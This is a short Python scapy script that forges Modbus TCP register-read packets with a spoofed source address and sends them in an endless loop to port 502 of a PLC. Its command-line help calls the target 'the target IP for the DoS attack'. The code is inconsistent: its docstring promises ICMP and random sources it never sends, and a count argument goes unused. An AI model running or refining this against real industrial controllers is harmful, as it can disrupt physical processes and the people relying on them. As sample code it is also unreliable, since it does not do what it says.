from scapy.all import IP, ICMP, TCP, send, ls, ShortField, XByteField, Packet
import random
import time
from scapy.contrib.modbus import ModbusADURequest, ModbusPDU03ReadHoldingRegistersRequest
import argparse


def create_modbus_tcp_packet(dst_ip, src_ip="192.168.1.86", unit_id=1, func_code=3, start_addr=0, quantity=1):
    """
    Create a Modbus TCP packet to read registers of PLC.

    Args:
    - dst_ip: Destination IP address
    - src_ip: Source IP address (optional)
    - unit_id: Unit identifier
    - func_code: Modbus function code (3 for reading holding registers)
    - start_addr: Start address of the register to read
    - quantity: Number of registers to read

    Returns:
    - packet: Constructed Modbus TCP packet
    """

    ip_layer = IP(src=src_ip, dst=dst_ip)
    tcp_layer = TCP(sport=random.randint(1024,65535), dport=502)  # Modbus TCP typically uses port 502

    # Modbus PDU
    modbus_pdu = ModbusPDU03ReadHoldingRegistersRequest(funcCode=func_code, startAddr=start_addr, quantity=quantity)

    # Modbus ADU
    modbus_adu = ModbusADURequest(protoId=0, unitId=unit_id) / modbus_pdu

    return ip_layer / tcp_layer / modbus_adu

def send_packets(target, count=100, interval=0.1):
    """Send Modbus and ICMP packets from random source addresses to a target at intervals."""
    while True:
        print(f"Sending packets to {target}")
        modbus_packet = create_modbus_tcp_packet(target)
        send(modbus_packet, verbose=False)
        time.sleep(interval)

parser = argparse.ArgumentParser()
parser.add_argument('target', help='the target IP for the DoS attack')
args = parser.parse_args()

send_packets(args.target, count=100, interval=5)